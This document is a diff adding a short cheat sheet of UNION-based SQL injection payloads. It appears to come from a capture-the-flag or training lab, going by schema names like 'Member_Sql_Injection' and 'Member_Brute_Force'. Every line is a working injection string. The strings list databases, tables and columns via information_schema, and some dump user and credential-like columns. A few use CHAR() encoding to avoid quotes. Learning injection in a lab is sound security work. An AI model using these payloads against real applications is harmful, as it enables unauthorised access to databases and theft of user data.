@@ -1,0 +1,25 @@
+List all tables:
+1 UNION SELECT table_name, NULL FROM information_schema.tables --
+
+List current database:
+1 UNION SELECT database(), NULL --
+
+List all databases:
+1 UNION SELECT schema_name, NULL FROM information_schema.schemata --
+
+List tables from database
+1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = CHAR(77, 101, 109, 98, 101, 114, 95, 83, 113, 108, 95, 73, 110, 106, 101, 99, 116, 105, 111, 110) --
+1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'Member_Sql_Injection'
+
+List columns from a table in current database
+1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = CHAR(117, 115, 101, 114, 115) --
+1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users'
+
+List columns from a table in specific database
+1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'db_default' AND table_schema = 'Member_Brute_Force' --
+
+Show content from a column from a table in current database
+1 UNION SELECT countersign, NULL FROM users --
+
+Show content from a column from a table in specific database
+1 UNION SELECT username, NULL FROM Member_Brute_Force.db_default -- 
